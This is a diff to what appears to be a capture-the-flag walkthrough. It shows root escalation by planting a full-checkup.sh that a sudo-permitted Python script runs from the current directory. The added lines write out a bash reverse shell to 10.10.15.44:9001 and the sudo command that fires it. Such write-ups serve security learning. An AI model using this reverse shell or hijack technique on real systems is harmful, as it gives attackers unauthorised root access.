@@ -139,3 +139,14 @@ I want to check system-checkup.py as thats what we run as sudo, and I got a "Som
 
 Aha! Looks like it looks for a local script called ./full-checkup.sh and runs it! This could mean we may be able to run this script as root! Let's make a revshell to run and call it full-checkup.sh.
 
+```
+#!/bin/bash
+sh -i >& /dev/tcp/10.10.15.44/9001 0>&1
+```
+Now I've made my revshell I run it as sudo with the following:
+```
+sudo /usr/bin/python3 /opt/scripts/system-checkup.py full-checkup
+```
+And on my listener I recieve root!
+
+<img width="1402" height="506" alt="{7EA51F6D-CA12-46CE-8344-28D23FDFF9CA}" src="https://github.com/user-attachments/assets/dd302497-b90e-4aaf-a873-9260ae7da920" />
